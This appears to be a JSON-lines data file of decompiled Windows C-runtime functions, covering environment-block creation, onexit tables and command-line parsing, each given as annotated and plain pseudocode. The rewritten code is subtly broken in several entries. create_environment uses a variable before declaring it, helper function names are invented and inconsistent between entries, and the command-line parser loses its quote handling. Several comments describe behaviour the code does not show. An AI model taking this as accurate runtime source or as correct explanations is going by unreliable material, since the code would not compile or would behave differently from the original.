variables\n        currentChar = *param_1; // Get the next character\n    }\n    \n    // Allocate memory for the environment array\n    allocatedEnvArrayPtr = (wchar_t **)_calloc_base((longlong)variableCountPtr + 1, 8);\n    if (allocatedEnvArrayPtr != (wchar_t **)0x0) { // Check if allocation was successful\n        for (currentEnvVarPtr = allocatedEnvArrayPtr; *param_1 != L'\\0'; param_1 += variableSize) {\n            longlong variableLengthIndex = -1; // Initialize index for variable length calculation\n            do {\n                variableLengthIndex++; // Increment index\n            } while (param_1[variableLengthIndex] != L'\\0'); // Continue until null terminator\n            ulonglong variableSize = variableLengthIndex + 2; // Calculate size for the variable\n            if (*param_1 != L'=') { // Check if the current variable is not an empty variable\n                individualEnvVarStrPtr = (wchar_t *)_calloc_base(variableSize, 2); // Allocate memory for the variable\n                if (individualEnvVarStrPtr == (wchar_t *)0x0) { // Check if allocation was successful\n                    free_environment<wchar_t>(allocatedEnvArrayPtr); // Free previously allocated memory on failure\n                    break; // Exit the loop\n                }\n                errno_t copyError = wcscpy_s(individualEnvVarStrPtr, variableSize, param_1); // Copy the variable string\n                if (copyError != 0) { // Check for copy errors\n                    _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Handle error\n                }\n                *currentEnvVarPtr++ = individualEnvVarStrPtr; // Store the variable in the environment array\n            }\n        }\n    }\n    return allocatedEnvArrayPtr; // Return the populated environment array\n}\n*\\ \n \n\nwchar_t ** __cdecl create_environment<wchar_t>(wchar_t *param_1)\n{\n    wchar_t **currentEnvVarPtr;\n    wchar_t **allocatedEnvArrayPtr;\n    wchar_t *individualEnvVarStrPtr;\n    wchar_t **variableCountPtr = (wchar_t **)0x0;\n    wchar_t currentChar = *param_1;\n\n    while (currentChar != L'\\0') {\n        currentEnvVarPtr = (wchar_t **)((longlong)variableCountPtr + 1);\n        if (currentChar == L'=') {\n            currentEnvVarPtr = variableCountPtr;\n        }\n        longlong variableLengthIndex = -1;\n        do {\n            variableLengthIndex++;\n        } while (param_1[variableLengthIndex] != L'\\0');\n        param_1 += variableLengthIndex + 2;\n        variableCountPtr = currentEnvVarPtr;\n        currentChar = *param_1;\n    }\n    \n    allocatedEnvArrayPtr = (wchar_t **)_calloc_base((longlong)variableCountPtr + 1, 8);\n    if (allocatedEnvArrayPtr != (wchar_t **)0x0) {\n        for (currentEnvVarPtr = allocatedEnvArrayPtr; *param_1 != L'\\0'; param_1 += variableSize) {\n            longlong variableLengthIndex = -1;\n            do {\n                variableLengthIndex++;\n            } while (param_1[variableLengthIndex] != L'\\0');\n            ulonglong variableSize = variableLengthIndex + 2;\n            if (*param_1 != L'=') {\n                individualEnvVarStrPtr = (wchar_t *)_calloc_base(variableSize, 2);\n                if (individualEnvVarStrPtr == (wchar_t *)0x0) {\n                    free_environment<wchar_t>(allocatedEnvArrayPtr);\n                    break;\n                }\n                errno_t copyError = wcscpy_s(individualEnvVarStrPtr, variableSize, param_1);\n                if (copyError != 0) {\n                    _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n                }\n                *currentEnvVarPtr++ = individualEnvVarStrPtr;\n            }\n        }\n    }\n    return allocatedEnvArrayPtr;\n}\n"}
{"Function Name": "free_environment<wchar_t>", "Address": "140012d5c", "Source Code": "\\*\nvoid __cdecl free_environment<wchar_t>(wchar_t **wchar_array)\n{\n    // Check if the input parameter is not null\n    if (wchar_array != (wchar_t **)0x0) {\n        // Initialize a pointer to traverse the array of wchar_t pointers\n        wchar_t **current_wchar_ptr = wchar_array;\n        \n        // Loop through each wchar_t pointer in the array until a null pointer is encountered\n        while (*current_wchar_ptr != (wchar_t *)0x0) {\n            // Free the memory allocated for the current wchar_t string\n            _free_base(*current_wchar_ptr);\n            // Move to the next wchar_t pointer in the array\n            current_wchar_ptr++;\n        }\n        \n        // Free the memory allocated for the array of wchar_t pointers itself\n        _free_base(wchar_array);\n    }\n}\n*\\ \n \n\nvoid __cdecl free_environment<wchar_t>(wchar_t **wchar_array)\n{\n    if (wchar_array != (wchar_t **)0x0) {\n        wchar_t **current_wchar_ptr = wchar_array;\n        while (*current_wchar_ptr != (wchar_t *)0x0) {\n            _free_base(*current_wchar_ptr);\n            current_wchar_ptr++;\n        }\n        _free_base(wchar_array);\n    }\n}\n"}
{"Function Name": "uninitialize_environment_internal<>", "Address": "140012da0", "Source Code": "\nvoid uninitialize_environment_internal<>(undefined8 *env_ptr)\n{\n    // Check if the pointer at param_1 is not equal to the predefined constant DAT_14003a238\n    if ((wchar_t **)*env_ptr != PREDEFINED_CONSTANT) {\n        // If the condition is true, free the environment memory allocated for wchar_t\n        free_env_memory<wchar_t>((wchar_t **)*env_ptr);\n    }\n}\n"}
{"Function Name": "uninitialize_environment_internal<>", "Address": "140012dbc", "Source Code": "\nvoid uninitialize_environment_internal<>(undefined8 *env_ptr)\n{\n    // Check if the pointer at param_1 is not equal to the predefined constant DAT_14003a230\n    if ((wchar_t **)*env_ptr != PREDEFINED_CONSTANT) {\n        // Free the environment memory if the condition is met\n        release_environment<wchar_t>((wchar_t **)*env_ptr);\n    }\n}\n"}
{"Function Name": "__dcrt_uninitialize_environments_nolock", "Address": "140012dd8", "Source Code": "\nvoid __dcrt_uninitialize_environments_nolock(void)\n{\n    // Call the internal function to uninitialize the environment using the first data pointer\n    uninitializeEnvInternal<>((undefined8 *)&firstDataPointer);\n    \n    // Call the internal function to uninitialize the environment using the second data pointer\n    uninitializeEnvInternal<>(&secondDataPointer);\n    \n    // Free the memory allocated for the environment associated with the wchar_t type\n    freeEnv<wchar_t>(wcharEnv1);\n    \n    // Free the memory allocated for another environment associated with the wchar_t type\n    freeEnv<wchar_t>(wcharEnv2);\n}\n"}
{"Function Name": "common_initialize_environment_nolock<wchar_t>", "Address": "140012e10", "Source Code": "\\*\nint __cdecl common_initialize_environment_nolock<wchar_t>(void)\n{\n    int returnStatus = 0; // Initialize return variable to 0\n    wchar_t *environmentString; // Pointer for wide character environment string\n\n    // Check if the global environment variable pointer is null\n    if (existingEnvironmentPointer == (wchar_t **)0x0) {\n        // Retrieve the wide character environment from the OS\n        environmentString = (wchar_t *)__dcrt_get_wide_environment_from_os();\n        // Check if the environment retrieval was successful\n        if (environmentString == (wchar_t *)0x0) {\n            returnStatus = -1; // Set return value to -1 if retrieval failed\n        } else {\n            // Create a new environment from the retrieved wide character string\n            wchar_t **newEnvironmentPointer = create_environment<wchar_t>(environmentString);\n            // Check if the environment creation was successful\n            if (newEnvironmentPointer == (wchar_t **)0x0) {\n                returnStatus = -1; // Set return value to -1 if creation failed\n                newEnvironmentPointer = existingEnvironmentPointer; // Fallback to existing environment pointer\n            }\n            // Set global pointers to the newly created environment\n            globalEnvironmentPointer = newEnvironmentPointer;\n            existingEnvironmentPointer = newEnvironmentPointer;\n            // Free the base memory (not used)\n            _free_base((LPVOID)0x0);\n        }\n        // Free the memory allocated for the wide character environment string\n        _free_base(environmentString);\n    }\n    return returnStatus; // Return the status of the initialization\n}\n*\\ \n \n\nint __cdecl common_initialize_environment_nolock<wchar_t>(void)\n{\n    int returnStatus = 0;\n    wchar_t *environmentString;\n\n    if (existingEnvironmentPointer == (wchar_t **)0x0) {\n        environmentString = (wchar_t *)__dcrt_get_wide_environment_from_os();\n        if (environmentString == (wchar_t *)0x0) {\n            returnStatus = -1;\n        } else {\n            wchar_t **newEnvironmentPointer = create_environment<wchar_t>(environmentString);\n            if (newEnvironmentPointer == (wchar_t **)0x0) {\n                returnStatus = -1;\n                newEnvironmentPointer = existingEnvironmentPointer;\n            }\n            globalEnvironmentPointer = newEnvironmentPointer;\n            existingEnvironmentPointer = newEnvironmentPointer;\n            _free_base((LPVOID)0x0);\n        }\n        _free_base(environmentString);\n    }\n    return returnStatus;\n}\n"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_638799b9deba96c50f710eeac98168cd>,class_<lambda_22ebabd17bc4fa466a2aca6d8deb888d>&___ptr64,class_<lambda_a6f7d7db0129f75315ebf26d50c089f1>_>", "Address": "140012e18", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_638799b9deba96c50f710eeac98168cd>,class_<lambda_22ebabd17bc4fa466a2aca6d8deb888d>&___ptr64,class_<lambda_a6f7d7db0129f75315ebf26d50c089f1>_>\n(__crt_seh_guarded_call<int> *this, // Pointer to the current instance of __crt_seh_guarded_call\n<lambda_638799b9deba96c50f710eeac98168cd> *param_1, // Pointer to the first lambda parameter\n<lambda_22ebabd17bc4fa466a2aca6d8deb888d> *param_2, // Pointer to the second lambda parameter\n<lambda_a6f7d7db0129f75315ebf26d50c089f1> *param_3) // Pointer to the third lambda parameter\n{\n    __acrt_lock(*(int *)param_1); // Locking mechanism to ensure thread safety using the first parameter\n    int result = <lambda_22ebabd17bc4fa466a2aca6d8deb888d>::operator()(param_2); // Calling operator() on the second lambda and storing the result\n    __acrt_unlock(*(int *)param_3); // Unlocking mechanism to release the lock using the third parameter\n    return result; // Returning the result of the lambda call\n}\n*\\ \n \n\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_638799b9deba96c50f710eeac98168cd>,class_<lambda_22ebabd17bc4fa466a2aca6d8deb888d>&___ptr64,class_<lambda_a6f7d7db0129f75315ebf26d50c089f1>_>\n(__crt_seh_guarded_call<int> *this,<lambda_638799b9deba96c50f710eeac98168cd> *param_1,\n<lambda_22ebabd17bc4fa466a2aca6d8deb888d> *param_2,\n<lambda_a6f7d7db0129f75315ebf26d50c089f1> *param_3)\n{\n    __acrt_lock(*(int *)param_1);\n    int result = <lambda_22ebabd17bc4fa466a2aca6d8deb888d>::operator()(param_2);\n    __acrt_unlock(*(int *)param_3);\n    return result;\n}\n"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_7777bce6b2f8c936911f934f8298dc43>,class_<lambda_f03950bc5685219e0bcd2087efbe011e>&___ptr64,class_<lambda_3883c3dff614d5e0c5f61bb1ac94921c>_>", "Address": "140012e54", "Source Code": "\\*\n// Define a member function of the __crt_seh_guarded_call class template\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_7777bce6b2f8c936911f934f8298dc43>,class_<lambda_f03950bc5685219e0bcd2087efbe011e>&___ptr64,class_<lambda_3883c3dff614d5e0c5f61bb1ac94921c>_>\n(__crt_seh_guarded_call<int> *this, // Pointer to the current instance of __crt_seh_guarded_call\n<lambda_7777bce6b2f8c936911f934f8298dc43> *param_1, // Pointer to the first lambda parameter\n<lambda_f03950bc5685219e0bcd2087efbe011e> *param_2, // Pointer to the second lambda parameter\n<lambda_3883c3dff614d5e0c5f61bb1ac94921c> *param_3) // Pointer to the third lambda parameter\n{\n    // Acquire a lock using the first parameter\n    __acrt_lock(*(int *)param_1);\n    \n    // Call the operator() of the second lambda and store the result\n    int result = <lambda_f03950bc5685219e0bcd2087efbe011e>::operator()(param_2);\n    \n    // Release the lock using the third parameter\n    __acrt_unlock(*(int *)param_3);\n    \n    // Return the result of the lambda call\n    return result;\n}\n*\\ \n \n\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_7777bce6b2f8c936911f934f8298dc43>,class_<lambda_f03950bc5685219e0bcd2087efbe011e>&___ptr64,class_<lambda_3883c3dff614d5e0c5f61bb1ac94921c>_>\n(__crt_seh_guarded_call<int> *this,<lambda_7777bce6b2f8c936911f934f8298dc43> *param_1,\n<lambda_f03950bc5685219e0bcd2087efbe011e> *param_2,\n<lambda_3883c3dff614d5e0c5f61bb1ac94921c> *param_3)\n{\n__acrt_lock(*(int *)param_1);\nint result = <lambda_f03950bc5685219e0bcd2087efbe011e>::operator()(param_2);\n__acrt_unlock(*(int *)param_3);\nreturn result;\n}\n"}
{"Function Name": "<lambda_22ebabd17bc4fa466a2aca6d8deb888d>::operator()", "Address": "140012e90", "Source Code": "\nint __thiscall\n<lambda_22ebabd17bc4fa466a2aca6d8deb888d>::operator()\n(<lambda_22ebabd17bc4fa466a2aca6d8deb888d> *this)\n{\n    int iVar1; // Variable to store return value\n    LPVOID pvVar2; // Pointer for reallocated memory\n    byte bVar3; // Variable for bit manipulation\n    ulonglong *puVar4; // Pointer to hold manipulated ulonglong value\n    ulonglong uVar5; // Variable for size calculations\n    LPVOID pvVar6; // Pointer to hold original memory\n    ulonglong uVar7; // Variable for size limit\n    ulonglong uVar8; // Variable for adjusted size\n    ulonglong *puVar10; // Pointer to the first ulonglong in the structure\n\n    puVar10 = (ulonglong *)**(longlong **)this; // Dereference to get the first ulonglong\n    if (puVar10 == (ulonglong *)0x0) { // Check if the pointer is null\n        iVar1 = -1; // Set return value to -1 if null\n    }\n    else {\n        bVar3 = (byte)DAT_140038080 & 0x3f; // Extract bits for manipulation\n        puVar4 = (ulonglong *)((puVar10[2] ^ DAT_140038080) >> bVar3 | (puVar10[2] ^ DAT_140038080) << 0x40 - bVar3); // Manipulate second ulonglong\n        pvVar6 = (LPVOID)((DAT_140038080 ^ *puVar10) >> bVar3 | (DAT_140038080 ^ *puVar10) << 0x40 - bVar3); // Manipulate first ulonglong\n        puVar10 = (ulonglong *)((puVar10[1] ^ DAT_140038080) >> bVar3 | (puVar10[1] ^ DAT_140038080) << 0x40 - bVar3); // Manipulate first ulonglong again\n        if (puVar10 == puVar4) { // Check if the manipulated pointers are equal\n            uVar5 = (longlong)puVar4 - (longlong)pvVar6 >> 3; // Calculate size difference\n            uVar7 = uVar5; // Store size difference\n            if (0x200 < uVar5) { // Limit size to 0x200\n                uVar7 = 0x200; // Cap size at 0x200\n            }\n            uVar8 = uVar7 + uVar5; // Calculate new size\n            if (uVar7 + uVar5 == 0) { // Check if size is zero\n                uVar8 = 0x20; // Set minimum size to 0x20\n            }\n            if (uVar8 < uVar5) { // Check if new size is less than original\n                uVar8 = uVar5 + 4; // Adjust size\n                pvVar2 = _recalloc_base(pvVar6, uVar8, 8); // Reallocate memory\n                _free_base((LPVOID)0x0); // Free old memory\n                if (pvVar2 == (LPVOID)0x0) goto LAB_140013024; // Check for allocation failure\n            }\n            else {\n                pvVar2 = _recalloc_base(pvVar6, uVar8, 8); // Reallocate memory\n                _free_base((LPVOID)0x0); // Free old memory\n                if (pvVar2 == (LPVOID)0x0) goto LAB_140012f32; // Check for allocation failure\n            }\n            pvVar6 = pvVar2; // Update pointer to new memory\n            uVar7 = DAT_140038080; // Store original DAT value\n            puVar10 = (ulonglong *)((longlong)pvVar6 + uVar5 * 8); // Calculate new pointer position\n            puVar4 = (ulonglong *)((longlong)pvVar6 + uVar8 * 8); // Calculate end pointer position\n            uVar5 = (ulonglong)((longlong)puVar4 + (7 - (longlong)puVar10)) >> 3; // Calculate number of elements to initialize\n            if (puVar4 < puVar10) { // Check if end pointer is before current pointer\n                uVar5 = 0; // Set count to zero\n            }\n            if (uVar5 != 0) { // If there are elements to initialize\n                ulonglong *puVar9 = puVar10; // Initialize pointer for loop\n                for (; uVar5 != 0; uVar5--) { // Loop to initialize elements\n                    *puVar9++ = uVar7; // Set each element to original DAT value\n                }\n            }\n        }\n        bVar3 = -((byte)DAT_140038080 & 0x3f) & 0x3f; // Calculate bit shift for final assignment\n        *puVar10 = (**(ulonglong **)(this + 8) >> bVar3 | **(ulonglong **)(this + 8) << 0x40 - bVar3) ^ DAT_140038080; // Assign manipulated value to the first ulonglong\n        *(ulonglong *)**(undefined8 **)this = ((ulonglong)pvVar6 >> bVar3 | (longlong)pvVar6 << 0x40 - bVar3) ^ DAT_140038080; // Assign manipulated value to the second ulonglong\n        *(ulonglong *)(**(longlong **)this + 8) = ((ulonglong)(puVar10 + 1) >> bVar3 | (longlong)(puVar10 + 1) << 0x40 - bVar3) ^ DAT_140038080; // Assign manipulated value to the third ulonglong\n        bVar3 = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f; // Calculate bit shift for final assignment\n        iVar1 = 0; // Set return value to 0\n        *(ulonglong *)(**(longlong **)this + 0x10) = ((ulonglong)puVar4 >> bVar3 | (longlong)puVar4 << 0x40 - bVar3) ^ DAT_140038080; // Assign manipulated value to the fourth ulonglong\n    }\n    return iVar1; // Return the result\n}\n"}
{"Function Name": "<lambda_f03950bc5685219e0bcd2087efbe011e>::operator()", "Address": "140013040", "Source Code": "\nint __thiscall\n<lambda_f03950bc5685219e0bcd2087efbe011e>::operator()\n(<lambda_f03950bc5685219e0bcd2087efbe011e> *this)\n{\n    ulonglong uVar1 = DAT_140038080; // Retrieve a global variable\n    ulonglong *puVar8 = (ulonglong *)**(longlong **)this; // Dereference 'this' to get a pointer\n\n    if (puVar8 == (ulonglong *)0x0) { // Check if the pointer is null\n        return -1; // Return -1 if the pointer is null\n    }\n    \n    byte bVar5 = (byte)uVar1 & 0x3f; // Mask the lower 6 bits of uVar1\n    ulonglong *puVar10 = (ulonglong *)((uVar1 ^ *puVar8) >> bVar5 | (uVar1 ^ *puVar8) << 0x40 - bVar5); // Perform bitwise operations\n    puVar8 = (ulonglong *)((puVar8[1] ^ uVar1) >> bVar5 | (puVar8[1] ^ uVar1) << 0x40 - bVar5); // Update puVar8 with similar operations\n    \n    if ((longlong)puVar10 - 1U < 0xfffffffffffffffe) { // Check if puVar10 is within a valid range\n        uint uVar7 = (uint)uVar1 & 0x3f; // Mask the lower 6 bits of uVar1 again\n        ulonglong *puVar9 = puVar8; // Store the current value of puVar8\n        ulonglong uVar3 = uVar1; // Store uVar1 in uVar3\n        ulonglong *puVar13 = puVar10; // Store puVar10 in puVar13\n        \n        while (puVar8--, puVar10 <= puVar8) { // Loop while puVar10 is less than or equal to puVar8\n            if (*puVar8 != uVar1) { // Check if the value at puVar8 is not equal to uVar1\n                *puVar8 = uVar1; // Set the value at puVar8 to uVar1\n                (*(code *)PTR__guard_dispatch_icall_1400213e8)(uVar7); // Call a function with uVar7\n                ulonglong uVar11 = *(ulonglong *)**(longlong **)this ^ uVar1; // XOR operation with dereferenced this\n                uVar3 = ((ulonglong *)**(longlong **)this)[1] ^ uVar1; // Update uVar3 with another XOR operation\n                sbyte sVar6 = (sbyte)uVar7; // Cast uVar7 to signed byte\n                ulonglong *puVar12 = (ulonglong *)(uVar11 >> sVar6 | uVar11 << 0x40 - sVar6); // Bitwise operations on uVar11\n                ulonglong *puVar4 = (ulonglong *)(uVar3 >> sVar6 | uVar3 << 0x40 - sVar6); // Bitwise operations on uVar3\n                \n                if ((puVar12 != puVar13) || (puVar4 != puVar9)) { // Check if puVar12 or puVar4 are different from their respective previous values\n                    puVar8 = puVar4; // Update puVar8\n                    puVar9 = puVar4; // Update puVar9\n                    puVar10 = puVar12; // Update puVar10\n                    puVar13 = puVar12; // Update puVar13\n                }\n            }\n        }\n        \n        if (puVar10 != (ulonglong *)0xffffffffffffffff) { // Check if puVar10 is not equal to a specific value\n            _free_base(puVar10); // Free the memory pointed to by puVar10\n        }\n    }\n    \n    *(ulonglong *)**(undefined8 **)this = uVar1; // Set the first element of the dereferenced this to uVar1\n    *(ulonglong *)(**(longlong **)this + 8) = uVar1; // Set the second element of the dereferenced this to uVar1\n    *(ulonglong *)(**(longlong **)this + 0x10) = uVar1; // Set the third element of the dereferenced this to uVar1\n    \n    return 0; // Return 0 to indicate success\n}\n"}
{"Function Name": "FUN_140013158", "Address": "140013158", "Source Code": "\nvoid FUN_140013158(undefined8 exit_param)\n{\n    // Register the function located at address DAT_14003a240 to be called on exit\n    // with the parameter param_1 passed to it.\n    _register_onexit_function(&exit_function_address, exit_param);\n}\n"}
{"Function Name": "_execute_onexit_table", "Address": "140013168", "Source Code": "\nvoid _execute_onexit_table(undefined8 exit_param)\n{\n    undefined8 exit_local = exit_param; // Store the parameter in a local variable\n    __crt_seh_guarded_call<int> seh_guarded_calls[8]; // Declare an array for SEH guarded calls\n    undefined4 init_values[2] = {2, 0}; // Initialize an array with specific values\n    undefined8 *pointer_array[3] = {&exit_local, nullptr, nullptr}; // Create an array of pointers, initializing the first element\n\n    // Call the operator of __crt_seh_guarded_call with specified template parameters\n    __crt_seh_guarded_call<int>::\n    operator()<class_<lambda_7777bce6b2f8c936911f934f8298dc43>,class_<lambda_f03950bc5685219e0bcd2087efbe011e>&___ptr64,class_<lambda_3883c3dff614d5e0c5f61bb1ac94921c>_>\n    (seh_guarded_calls, // Pass the SEH guarded call array\n    (class_<lambda_7777bce6b2f8c936911f934f8298dc43> *)init_values, // Cast local_res18 to the first lambda type\n    (class_<lambda_f03950bc5685219e0bcd2087efbe011e> *)pointer_array, // Cast local_18 to the second lambda type\n    (class_<lambda_3883c3dff614d5e0c5f61bb1ac94921c> *)init_values); // Cast local_res18 to the third lambda type\n}\n"}
{"Function Name": "_initialize_onexit_table", "Address": "1400131a4", "Source Code": "\nundefined8 _initialize_onexit_table(longlong *exit_table)\n{\n    // Check if the input parameter is a null pointer\n    if (exit_table == (longlong *)0x0) {\n        return 0xffffffff; // Return error code if null pointer\n    }\n    \n    // Check if the first element is equal to the third element in the array\n    if (*exit_table == exit_table[2]) {\n        // Initialize the first three elements of the array with a predefined value\n        *exit_table = initial_value; // Set first element\n        exit_table[1] = initial_value; // Set second element\n        exit_table[2] = initial_value; // Set third element\n    }\n    \n    return 0; // Return success code\n}\n"}
{"Function Name": "_register_onexit_function", "Address": "1400131cc", "Source Code": "\nvoid _register_onexit_function(undefined8 exit_param_1, undefined8 exit_param_2)\n{\n    // Declare an array to hold results for SEH (Structured Exception Handling) guarded calls\n    __crt_seh_guarded_call<int> seh_guarded_results[8];\n    \n    // Initialize an array with a single element set to 2\n    undefined4 single_element_array_1[2] = {2};\n    \n    // Initialize another array with a single element set to 2\n    undefined4 single_element_array_2[2] = {2};\n\n    // Invoke the SEH guarded call operator with the specified template parameters\n    __crt_seh_guarded_call<int>::\n    operator()<class_<lambda_638799b9deba96c50f710eeac98168cd>, class_<lambda_22ebabd17bc4fa466a2aca6d8deb888d>&___ptr64, class_<lambda_a6f7d7db0129f75315ebf26d50c089f1>_>\n    (seh_guarded_results, \n     // Pass the address of local_28 as a pointer to the first lambda class\n     (class_<lambda_638799b9deba96c50f710eeac98168cd> *)&single_element_array_2,\n     // Pass the address of param_1 as a pointer to the second lambda class\n     (class_<lambda_22ebabd17bc4fa466a2aca6d8deb888d> *)&exit_param_1,\n     // Pass local_res20 as a pointer to the third lambda class\n     (class_<lambda_a6f7d7db0129f75315ebf26d50c089f1> *)single_element_array_1);\n}\n"}
{"Function Name": "FUN_140013228", "Address": "140013228", "Source Code": "\nundefined8 initialize_on_exit_table(void) // Function definition returning an undefined8 type\n{\n    initialize_on_exit((longlong *)&on_exit_table_1); // Initialize the on-exit table with the address DAT_14003a240\n    return CONCAT71((int7)((ulonglong)initialize_on_exit((longlong *)&on_exit_table_2) >> 8), 1); // Call _initialize_onexit_table with DAT_14003a258, shift the result, and concatenate with 1\n}\n"}
{"Function Name": "FUN_14001324c", "Address": "14001324c", "Source Code": "\nundefined1 uninitializeEnvironments(void) // Function definition with return type undefined1\n{\n    uninitializeEnvironmentsNoLock(); // Call to uninitialize environments without locking\n    return 1; // Return value of 1\n}\n"}
{"Function Name": "FUN_14001325c", "Address": "14001325c", "Source Code": "\nundefined1 executeFunction(void) // Function definition with return type undefined1\n{\n    processData1(dataPointer); // Call to FUN_14000ec40 with DAT_140038080 as argument\n    processData2(dataPointer); // Call to FUN_140012380 with DAT_140038080 as argument\n    processData3(dataPointer); // Call to FUN_140018228 with DAT_140038080 as argument\n    processData4(dataPointer); // Call to FUN_1400133bc with DAT_140038080 as argument\n    processData5(dataPointer); // Call to FUN_1400127dc with DAT_140038080 as argument\n    return 1; // Return value of 1\n}\n"}
{"Function Name": "FUN_1400132a4", "Address": "1400132a4", "Source Code": "\nundefined8 FUN_1400132a4(void) // Function declaration returning an undefined 8-byte value\n{\n    ulonglong decrementedValue; // Declare a variable to hold an unsigned long long value\n    LOCK(); // Acquire a lock to ensure thread safety\n    decrementedValue = (ulonglong)(*dataPointer); // Dereference and cast the value pointed by DAT_14003a9a0 to ulonglong\n    *dataPointer = *dataPointer - 1; // Decrement the value pointed by DAT_14003a9a0\n    UNLOCK(); // Release the lock\n\n    // Check if the decremented value is 1 and if DAT_14003a9a0 is not pointing to DAT_1400387d0\n    if ((decrementedValue == 1) && (dataPointer != (uint *)&dataEndPointer)) {\n        _free_base(dataPointer); // Free the memory pointed by DAT_14003a9a0\n        dataPointer = (uint *)&dataEndPointer; // Update DAT_14003a9a0 to point to DAT_1400387d0\n    }\n    \n    return CONCAT71((int7)(decrementedValue >> 8), 1); // Return a concatenated value with the upper 7 bytes of uVar2 and the value 1\n}\n"}
{"Function Name": "FUN_1400132e4", "Address": "1400132e4", "Source Code": "\nundefined1 FUN_1400132e4(void) // Function definition with return type undefined1\n{\n    _free_base(memoryBlock1); // Free memory allocated at DAT_14003a468\n    _free_base(memoryBlock2); // Free memory allocated at DAT_14003a470\n    _free_base(memoryBlock3); // Free memory allocated at DAT_14003a9c0\n    _free_base(memoryBlock4); // Free memory allocated at DAT_14003a9c8\n    return 1; // Return 1 indicating successful execution\n}\n"}
{"Function Name": "FUN_140013340", "Address": "140013340", "Source Code": "\nvoid initialize_function(void) // Function definition for FUN_140013340\n{\n    // Call to __acrt_execute_initializers function\n    // Passing the address of PTR_LAB_140029090 and a pointer to DAT_140029190\n    __acrt_execute_initializers(&initializer_pointer, (undefined8 *)&data_pointer);\n}\n"}
{"Function Name": "__acrt_uninitialize", "Address": "140013354", "Source Code": "\nundefined8 __acrt_uninitialize(bool is_initialized)\n{\n    // Check if the parameter is true\n    if (is_initialized) {\n        // Check if the global variable DAT_14003a460 is not zero\n        if (global_variable != 0) {\n            // Call common_flush_all with param_1 and return a concatenated value\n            return CONCAT71((int7)((ulonglong)CONCAT44(0, flush_all_resources(is_initialized)) >> 8), 1);\n        }\n    }\n    // Call __acrt_execute_uninitializers with specific addresses and return the result\n    return execute_uninitializers(0x140029090, 0x140029190);\n}\n"}
{"Function Name": "FUN_14001338c", "Address": "14001338c", "Source Code": "\nundefined4 getUndefinedValue(void) // Function definition returning an undefined4 type\n{\n    return globalValue; // Return the value of the global variable DAT_14003a270\n}\n"}
{"Function Name": "FUN_140013394", "Address": "140013394", "Source Code": "\nvoid FUN_140013394(undefined4 inputValue) // Function definition with a parameter of type undefined4\n{\n    globalVariable = inputValue; // Assign the value of param_1 to the global variable DAT_14003a270\n}\n"}
{"Function Name": "FUN_14001339c", "Address": "14001339c", "Source Code": "\nbool FUN_14001339c(void)\n{\n    // Mask the value of DAT_140038080 to get the lower 6 bits\n    byte lowerBitsMask = (byte)inputValue & 0x3f;\n\n    // Check if the result of XOR between DAT_140038080 and _DAT_14003a278, \n    // shifted right by bVar1, is not zero OR if the result of XOR, \n    // shifted left by (0x40 - bVar1), is not zero\n    return (inputValue ^ comparisonValue) >> lowerBitsMask != 0 ||\n           (inputValue ^ comparisonValue) << (0x40 - lowerBitsMask) != 0;\n}\n"}
{"Function Name": "FUN_1400133bc", "Address": "1400133bc", "Source Code": "\nvoid FUN_1400133bc(undefined8 inputValue) // Function definition with a single parameter of type undefined8\n{\n    globalData = inputValue; // Assign the value of param_1 to the global variable _DAT_14003a278\n}\n"}
{"Function Name": "FUN_1400133c4", "Address": "1400133c4", "Source Code": "\nundefined8 FUN_1400133c4(undefined8 input_param)\n{\n    code *function_pointer; // Pointer to a function (code) that will be determined at runtime\n    byte lower_bits_mask = (byte)data_value & 0x3f; // Extracting the lower 6 bits of DAT_140038080\n    // Calculating the address of the function to call using a jumptable mechanism\n    function_pointer = (code *)((data_value ^ data_mask) >> lower_bits_mask |\n                                    (data_value ^ data_mask) << (0x40 - lower_bits_mask));\n    // Check if the calculated function pointer is not null\n    if (function_pointer != (code *)0x0) {\n        return (*function_pointer)(input_param); // Call the function with param_1 and return the result\n    }\n    return 0; // Return 0 if the function pointer is null\n}\n"}
{"Function Name": "FUN_1400133f4", "Address": "1400133f4", "Source Code": "\nvoid FUN_1400133f4(ulonglong input_value)\n{\n    // Calculate the value of bVar1 by subtracting the lower 6 bits of DAT_140038080 from 0x40\n    byte bit_shift = 0x40 - ((byte)data_value & 0x3f) & 0x3f;\n\n    // Perform a bitwise rotation of param_1 by bVar1 bits to the right, \n    // then XOR the result with DAT_140038080, and store it in _DAT_14003a278\n    result_value = (input_value >> bit_shift | input_value << 0x40 - bit_shift) ^ data_value;\n}\n"}
{"Function Name": "_get_wide_winmain_command_line", "Address": "14001341c", "Source Code": "\nushort * _get_wide_winmain_command_line(void) // Function to retrieve the wide command line\n{\n    ushort *commandLinePtr = &DAT_14003a280; // Initialize pointer to a specific memory location\n    if (DAT_14003a9d8 != (ushort *)0x0) { // Check if the alternate command line pointer is not null\n        commandLinePtr = DAT_14003a9d8; // If not null, use the alternate command line pointer\n    }\n    while (true) { // Infinite loop to process the command line\n        ushort currentChar = *commandLinePtr; // Dereference pointer to get the current character\n        if (currentChar < 0x21) { // Check if the character is a control character\n            if (currentChar == 0) { // If the character is null (end of string)\n                return commandLinePtr; // Return the current pointer\n            }\n            while (currentChar <= 0x20) { // Skip over whitespace characters\n                commandLinePtr++; // Move to the next character\n                currentChar = *commandLinePtr; // Get the next character\n                if (currentChar == 0) { // Check for null character again\n                    return commandLinePtr; // Return the current pointer if null\n                }\n            }\n            return commandLinePtr; // Return the pointer after skipping whitespace\n        }\n        if (currentChar == 0x22) { // Check if the character is a quote\n            commandLinePtr++; // Move to the next character\n            continue; // Continue to the next iteration of the loop\n        }\n        commandLinePtr++; // Move to the next character for any other case\n    }\n}\n"}
